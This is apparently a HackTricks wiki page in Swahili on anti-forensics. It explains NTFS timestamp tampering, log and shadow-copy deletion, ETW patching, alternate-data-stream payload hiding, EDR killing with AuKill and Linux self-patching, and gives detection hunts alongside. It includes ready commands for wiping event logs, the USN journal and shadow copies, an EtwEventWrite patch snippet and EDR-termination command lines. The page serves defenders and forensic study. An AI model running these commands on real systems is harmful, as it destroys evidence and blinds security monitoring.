# Mbinu za Anti-Forensic

{{#include ../../banners/hacktricks-training.md}}

## Mihuri ya Muda

Mshambuliaji anaweza kuwa na nia ya **kubadilisha mihuri ya muda ya mafaili** ili kuepuka kugunduliwa.\
Inawezekana kupata mihuri ya muda ndani ya MFT katika attributes `$STANDARD_INFORMATION` \_\_ na \_\_ `$FILE_NAME`.

Attributes zote mbili zina mihuri 4 ya muda: **Modification**, **access**, **creation**, na **MFT registry modification** (MACE au MACB).

**Windows explorer** na tools nyingine huonyesha taarifa kutoka **`$STANDARD_INFORMATION`**.

### TimeStomp - Anti-forensic Tool

Tool hii **hubadilisha** taarifa za mihuri ya muda ndani ya **`$STANDARD_INFORMATION`** **lakini** **si** taarifa zilizo ndani ya **`$FILE_NAME`**. Kwa hiyo, inawezekana **kutambua** shughuli **zenye kutia shaka**.

### Usnjrnl

**USN Journal** (Update Sequence Number Journal) ni kipengele cha NTFS (Windows NT file system) kinachofuatilia mabadiliko ya volume. Tool ya [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) inaruhusu kuchunguza mabadiliko haya.

![TimeStomp - Anti-forensic Tool - Usnjrnl: USN Journal (Update Sequence Number Journal) ni kipengele cha NTFS (Windows NT file system) kinachofuatilia mabadiliko ya volume. ...](<../../images/image (801).png>)

Picha iliyotangulia ni **output** iliyoonyeshwa na **tool**, ambapo inaweza kuonekana kwamba **mabadiliko fulani yalifanywa** kwenye file.

### $LogFile

**Mabadiliko yote ya metadata kwenye file system huwekwa kwenye log** katika mchakato unaojulikana kama [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging). Metadata iliyowekwa kwenye log huhifadhiwa katika file linaloitwa `**$LogFile**`, lililo katika root directory ya NTFS file system. Tools kama [LogFileParser](https://github.com/jschicht/LogFileParser) zinaweza kutumika ku-parse file hili na kutambua mabadiliko.

![Usnjrnl - $LogFile: Mabadiliko yote ya metadata kwenye file system huwekwa kwenye log katika mchakato unaojulikana kama write-ahead logging. Metadata iliyowekwa kwenye log huhifadhiwa katika file linaloitwa $LogFile , lililo katika root...](<../../images/image (137).png>)

Tena, katika output ya tool inawezekana kuona kwamba **mabadiliko fulani yalifanywa**.

Kwa kutumia tool hiyo hiyo inawezekana kutambua **mihuri ya muda ilibadilishwa lini**:

![Usnjrnl - $LogFile: Kwa kutumia tool hiyo hiyo inawezekana kutambua mihuri ya muda ilibadilishwa lini](<../../images/image (1089).png>)

- CTIME: Muda wa kuundwa kwa file
- ATIME: Muda wa kubadilishwa kwa file
- MTIME: Muda wa kubadilishwa kwa registry ya MFT ya file
- RTIME: Muda wa kufikiwa kwa file

### Ulinganisho wa `$STANDARD_INFORMATION` na `$FILE_NAME`

Njia nyingine ya kutambua mafaili yaliyobadilishwa kwa kutia shaka ni kulinganisha muda katika attributes zote mbili na kutafuta **kutolingana**.

### Nanoseconds

Mihuri ya muda ya **NTFS** ina **usahihi** wa **nanoseconds 100**. Kwa hiyo, kupata mafaili yenye mihuri ya muda kama 2010-10-10 10:10:**00.000:0000 kunatia shaka sana**.

### SetMace - Anti-forensic Tool

Tool hii inaweza kubadilisha attributes zote mbili `$STARNDAR_INFORMATION` na `$FILE_NAME`. Hata hivyo, kuanzia Windows Vista, OS inayoendeshwa lazima ibadilishe taarifa hizi.

## Kuficha Data

NFTS hutumia cluster na ukubwa wa chini wa taarifa. Hii inamaanisha kwamba ikiwa file linatumia cluster moja na nusu, **nusu iliyobaki haitatumika kamwe** hadi file lifutwe. Kwa hiyo, inawezekana **kuficha data katika slack space hii**.

Kuna tools kama slacker zinazoruhusu kuficha data katika nafasi hii "iliyofichwa". Hata hivyo, uchambuzi wa `$logfile` na `$usnjrnl` unaweza kuonyesha kwamba data fulani iliongezwa:

![SetMace - Anti-forensic Tool - Data Hiding: Kuna tools kama slacker zinazoruhusu kuficha data katika nafasi hii "iliyofichwa". Hata hivyo, uchambuzi wa $logfile na $usnjrnl unaweza kuonyesha kwamba...](<../../images/image (1060).png>)

Kisha, inawezekana kurejesha slack space kwa kutumia tools kama FTK Imager. Kumbuka kwamba aina hii ya tool inaweza kuhifadhi maudhui yakiwa yamefichwa au hata yamesimbwa kwa njia fiche.

## UsbKill

Hii ni tool ambayo **itazima computer ikiwa mabadiliko yoyote katika** ports za **USB** yatatambuliwa.\
Njia moja ya kugundua hili ni kukagua processes zinazoendeshwa na **kukagua kila python script inayoendeshwa**.

## Live Linux Distributions

Distros hizi **huendeshwa ndani ya** memory ya **RAM**. Njia pekee ya kuzitambua ni **ikiwa NTFS file-system ime-mountiwa kwa write permissions**. Ikiwa ime-mountiwa kwa read permissions pekee, haitawezekana kugundua intrusion.

## Ufutaji Salama

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

## Windows Configuration

Inawezekana kuzima mbinu kadhaa za Windows za kuweka logs ili kufanya uchunguzi wa forensics kuwa mgumu zaidi.

### Disable Timestamps - UserAssist

Hii ni registry key inayohifadhi tarehe na saa ambazo kila executable iliendeshwa na user.

Kuzima UserAssist kunahitaji hatua mbili:

1. Weka registry keys mbili, `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` na `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled`, zote ziwe zero ili kuashiria kwamba tunataka UserAssist izimwe.
2. Futa registry subtrees zako zinazoonekana kama `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`.

### Disable Timestamps - Prefetch

Hii huhifadhi taarifa kuhusu applications zilizotekelezwa kwa lengo la kuboresha performance ya Windows system. Hata hivyo, taarifa hizi zinaweza pia kuwa muhimu katika forensic practices.

- Endesha `regedit`
- Chagua file path `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- Bofya kulia kwenye `EnablePrefetcher` na `EnableSuperfetch`
- Chagua Modify kwenye kila moja ili kubadilisha value kutoka 1 (au 3) hadi 0
- Restart

### Disable Timestamps - Last Access Time

Kila folder inapofunguliwa kutoka NTFS volume kwenye Windows NT server, system huchukua muda wa **kusasisha timestamp field kwenye kila folder lililo kwenye orodha**, unaoitwa last access time. Kwenye NTFS volume inayotumiwa sana, hii inaweza kuathiri performance.

1. Fungua Registry Editor (Regedit.exe).
2. Nenda kwenye `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
3. Tafuta `NtfsDisableLastAccessUpdate`. Ikiwa haipo, ongeza DWORD hii na uweke value yake kuwa 1, ambayo itazima mchakato.
4. Funga Registry Editor na reboot server.

### Delete USB History

**USB Device Entries** zote huhifadhiwa katika Windows Registry chini ya **USBSTOR** registry key, iliyo na sub keys zinazoundwa kila unapochomeka USB Device kwenye PC au Laptop yako. Unaweza kupata key hii hapa `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Kuifuta** kutafuta USB history.\
Unaweza pia kutumia tool ya [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) ili kuhakikisha kwamba umezifuta (na kuzifuta).

File jingine linalohifadhi taarifa kuhusu USBs ni `setupapi.dev.log` lililo ndani ya `C:\Windows\INF`. Hili pia linapaswa kufutwa.

### Disable Shadow Copies

**Orodhesha** shadow copies kwa `vssadmin list shadowstorage`\
**Yafute** kwa kuendesha `vssadmin delete shadow`

Unaweza pia kuyafuta kupitia GUI kwa kufuata hatua zilizopendekezwa katika [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)

Ili kuzima shadow copies, fuata [steps from here](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Fungua Services program kwa kuandika "services" katika text search box baada ya kubofya Windows start button.
2. Katika orodha, tafuta "Volume Shadow Copy", ichague, kisha ufungue Properties kwa kubofya kulia.
3. Chagua Disabled katika "Startup type" drop-down menu, kisha thibitisha mabadiliko kwa kubofya Apply na OK.

Pia inawezekana kubadilisha configuration ya mafaili yatakayokopiwa katika shadow copy kwenye registry `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`

### Overwrite deleted files

- Unaweza kutumia **Windows tool**: `cipher /w:C` Hii itaambia cipher iondoe data yoyote kutoka disk space isiyotumika inayopatikana ndani ya C drive.
- Unaweza pia kutumia tools kama [**Eraser**](https://eraser.heidi.ie)

### Delete Windows event logs

- Windows + R --> eventvwr.msc --> Panua "Windows Logs" --> Bofya kulia kila category na uchague "Clear Log"
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Disable Windows event logs

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- Ndani ya services section zima service ya "Windows Event Log"
- `WEvtUtil.exec clear-log` au `WEvtUtil.exe cl`

### Disable $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Advanced Logging & Trace Tampering (2023-2025)

### PowerShell ScriptBlock/Module Logging

Versions za hivi karibuni za Windows 10/11 na Windows Server huhifadhi **PowerShell forensic artifacts nyingi** chini ya
`Microsoft-Windows-PowerShell/Operational` (events 4104/4105/4106).
Attackers wanaweza kuzima au kuzifuta wakati huo huo:
```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
Remove-WinEvent               # requires admin & Win11 23H2+
```
Defenders wanapaswa kufuatilia mabadiliko kwenye registry keys hizo na uondoaji wa PowerShell events kwa wingi.

### ETW (Event Tracing for Windows) Patch

Endpoint security products hutegemea sana ETW. Njia maarufu ya evasion ya mwaka 2024 ni kufanya patch ya `ntdll!EtwEventWrite`/`EtwEventWriteFull` kwenye memory ili kila ETW call irudishe `STATUS_SUCCESS` bila kutoa event:<sup>[[5]](#references)</sup>
```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
patch, sizeof(patch), NULL);
```
Public PoCs (k.m. `EtwTiSwallow`) hutumia primitive hiyo hiyo katika PowerShell au C++.
Kwa sababu patch ni **process-local**, EDR zinazoendesha ndani ya processes nyingine zinaweza kuikosa.<sup>[[5]](#references)</sup>
Detection: linganisha `ntdll` iliyo kwenye memory na iliyo kwenye disk, au weka hook kabla ya user-mode.

### Alternate Data Streams (ADS) Revival

Kampeni za malware za mwaka 2023 (k.m. loaders za **FIN12**) zimeonekana kuweka binaries za hatua ya pili
ndani ya ADS ili zisigunduliwe na scanners za kawaida:
```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```
Enumerate streams kwa kutumia `dir /R`, `Get-Item -Stream *`, au Sysinternals `streams64.exe`.
Kunakili host file kwenye FAT/exFAT au kupitia SMB kutaondoa stream iliyofichwa na kunaweza kutumiwa
na investigators kurejesha payload.

### BYOVD & “AuKill” (2023)

Bring-Your-Own-Vulnerable-Driver sasa hutumiwa kwa kawaida kwa **anti-forensics** katika
mivamizi ya ransomware.
Tool ya open-source **AuKill** hupakia driver iliyosainiwa lakini iliyo hatarini (`procexp152.sys`) ili
kusimamisha au kusitisha EDR na forensic sensors **kabla ya encryption na uharibifu wa log**:<sup>[[1]](#references)</sup>
```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```
Driver huondolewa baadaye, na kuacha artifacts chache sana.<sup>[[1]](#references)</sup>
Mitigations: wezesha Microsoft vulnerable-driver blocklist (HVCI/SAC),
na toa alert kuhusu uundaji wa kernel-service kutoka paths zinazoandikika na user.

---

## Linux Anti-Forensics: Self-Patching na Cloud C2 (2023–2025)

### Self‑patching huduma zilizo-compromise ili kupunguza detection (Linux)
Adversaries wanazidi kufanya “self‑patch” kwenye service mara tu baada ya kuiexploit, ili kuzuia re‑exploitation na kukandamiza detections zinazotegemea vulnerabilities. Wazo ni kubadilisha components zilizo vulnerable na latest legitimate upstream binaries/JARs, ili scanners ziripoti host kuwa imepatchiwa huku persistence na C2 zikiendelea.<sup>[[3]](#references)</sup>

Mfano: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604).<sup>[[3]](#references)[[4]](#references)</sup>
- Baada ya post‑exploitation, attackers walipakua legitimate JARs kutoka Maven Central (repo1.maven.org), wakafuta vulnerable JARs kwenye ActiveMQ install, na ku-restart broker.
- Hii ilifunga initial RCE huku ikihifadhi footholds nyingine (cron, mabadiliko ya SSH config, C2 implants tofauti).

Mfano wa uendeshaji (wa kuonyesha)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```
Vidokezo vya Forensic/hunting
- Kagua service directories kwa binary/JAR replacements ambazo hazikupangwa:
- Debian/Ubuntu: `dpkg -V activemq` na linganisha file hashes/paths na repo mirrors.
- RHEL/CentOS: `rpm -Va 'activemq*'`
- Tafuta JAR versions zilizo kwenye disk ambazo hazimilikiwi na package manager, au symbolic links zilizosasishwa out of band.
- Timeline: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` ili kuoanisha ctime/mtime na kipindi cha compromise.
- Shell history/process telemetry: ushahidi wa `curl`/`wget` kwenda `repo1.maven.org` au artifact CDNs nyingine mara tu baada ya initial exploitation.
- Change management: hakikisha ni nani aliyetumia “patch” na kwa nini, si kuthibitisha tu kwamba patched version ipo.

### Cloud-service C2 yenye bearer tokens na anti-analysis stagers
Tradecraft iliyobainika ilichanganya C2 paths nyingi za muda mrefu na anti-analysis packaging:<sup>[[3]](#references)</sup>
- Password-protected PyInstaller ELF loaders za kuzuia sandboxing na static analysis (kwa mfano, encrypted PYZ, temporary extraction chini ya `/_MEI*`).
- Indicators: `strings` hits kama `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
- Runtime artifacts: extraction kwenda `/tmp/_MEI*` au custom `--runtime-tmpdir` paths.
- Dropbox-backed C2 inayotumia hardcoded OAuth Bearer tokens
- Network markers: `api.dropboxapi.com` / `content.dropboxapi.com` zenye `Authorization: Bearer <token>`.
- Hunt kwenye proxy/NetFlow/Zeek/Suricata kwa outbound HTTPS kwenda Dropbox domains kutoka server workloads ambazo kwa kawaida hazisync files.
- Parallel/backup C2 kupitia tunneling (kwa mfano, Cloudflare Tunnel `cloudflared`), ili kudumisha control ikiwa channel moja itazuiwa.
- Host IOCs: `cloudflared` processes/units, config kwenye `~/.cloudflared/*.json`, outbound 443 kwenda Cloudflare edges.

### Persistence na “hardening rollback” ili kudumisha access (mifano ya Linux)
Attackers mara nyingi huunganisha self-patching na durable access paths:<sup>[[3]](#references)</sup>
- Cron/Anacron: edits kwenye `0anacron` stub katika kila `/etc/cron.*/` directory kwa periodic execution.
- Hunt:
```bash
for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
```
- SSH configuration hardening rollback: kuwezesha root logins na kubadilisha default shells za low-privileged accounts.
- Hunt kwa root login enablement:
```bash
grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
# flag values like "yes" or overly permissive settings
```
- Hunt kwa suspicious interactive shells kwenye system accounts (kwa mfano, `games`):
```bash
awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
```
- Random, short-named beacon artifacts (herufi 8 za alfabeti) zilizowekwa kwenye disk ambazo pia huwasiliana na cloud C2:
- Hunt:
```bash
find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
-exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
```

Defenders wanapaswa kuoanisha artifacts hizi na external exposure pamoja na service patching events ili kufichua anti-forensic self-remediation iliyotumiwa kuficha initial exploitation.

## References

- [1] [Sophos X-Ops – AuKill: Driver yenye Vulnerability Iliyotumiwa Kuzima EDR (Machi 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – Kupatch EtwEventWrite kwa Stealth: Detection & Hunting (Juni 2024)](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – Kupatch kwa persistence: Jinsi DripDropper Linux malware Inavyosogea Kwenye Cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
- [5] [Kuficha .NET Yako - ETW (Adam Chester / XPN)](https://blog.xpnsec.com/hiding-your-dotnet-etw/)
{{#include ../../banners/hacktricks-training.md}}
